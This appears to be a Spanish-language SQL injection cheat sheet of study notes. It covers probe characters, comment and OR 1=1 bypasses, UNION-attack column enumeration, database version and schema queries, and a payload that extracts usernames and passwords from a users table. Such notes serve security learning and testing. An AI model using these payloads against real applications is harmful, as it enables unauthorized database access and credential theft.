# ATAQUE: SQL INJECTION

## IDENTIFICAR LA VULNERABILIDAD

' | *simbolo comun para testear si existe SQLi o no.*

" | *simbolo comun para testear si existe SQLi o no.*

' -- | *simbolo comun para testear si existe SQLi o no.*

## COMENTARIOS "bypass"

-- | *dentro del lenguaje de SQL query, sirve para comentar de manera que todo lo que este despues de los simbolos, se ignora.* \
  ex: SELECT [columns] FROM products WHERE category = 'Gifts'--' AND released = 1

'#' | *dentro del lenguaje de SQL query "#", sirve para comentar de manera que todo lo que este despues del simbolo, se ignora.* \
  ex: SELECT [columns] FROM products WHERE category = 'Gifts'#' AND released = 1

## LOGIC BYPASS 

' OR 1=1-- | *sirve para crear una consulta a un resultado booleano, de manera que el inicio de la consulta es leido, el resto no ya que
es siempre TRUE.* \
  ex: SELECT [columns] FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1

USER-- | *cuando se tiene un usuario se podria probar la vulnerabilidad tratando de ver si hace bypass sin ingresar la contrasena.*

## UNION ATTACK

**PRE-REQ:** *numero de columnas y data type de cada columna*

#### COMO SABER EL NUMERO DE COLUMNAS ?

**METODO_1:** ' ORDER BY 1-- \
**METODO_2:** ' UNION SELECT NULL--

#### COMO SABER EL DATA TYPE DE UNA COLUMNA ?

> Microsoft, MySQL & PostgreSQL

' UNION SELECT 'a',NULL,NULL,NULL-- \
' UNION SELECT NULL,'a',NULL,NULL-- | >> *se tiene que hacer iterativo cambiando los campos para saber que tipo son.*

> Oracle

' UNION SELECT 'a','a' from DUAL--

#### IDENTIFICAR INFORMACION DEL MOTOR DE BASE DE DATOS [TIPO/VERSION] 

**Microsoft** >> SELECT @@version \
**MySQL** >> SELECT @@version \
**Oracle** >> SELECT banner FROM v$version | SELECT version FROM v$instance \
**PostgreSQL** >> SELECT version() 

#### LISTAR TABLAS DE LA BASE DE DATOS / [[Microsoft](https://learn.microsoft.com/en-us/sql/relational-databases/system-information-schema-views/tables-transact-sql?view=sql-server-ver16) | [MySQL](https://dev.mysql.com/doc/refman/8.0/en/information-schema-table-reference.html) | [PostgreSQL](https://www.postgresql.org/docs/current/infoschema-tables.html)] 

SELECT [columns] FROM information_schema.tables \
SELECT [columns] FROM information_schema.columns \
SELECT [columns] FROM information_schema.columns WHERE table_name = 'users_qmwbqm' 

#### LISTAR TABLAS DE LA BASE DE DATOS / [[Oracle](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)] 

SELECT [columns] FROM all_tables \
SELECT [columns] FROM all_tab_columns WHERE table_name = 'USERS' 

#### MOSTRAR INFORMACION DE OTRAS TABLAS 

' UNION SELECT username, password FROM users-- | *retrieve the username and password from table "users"*




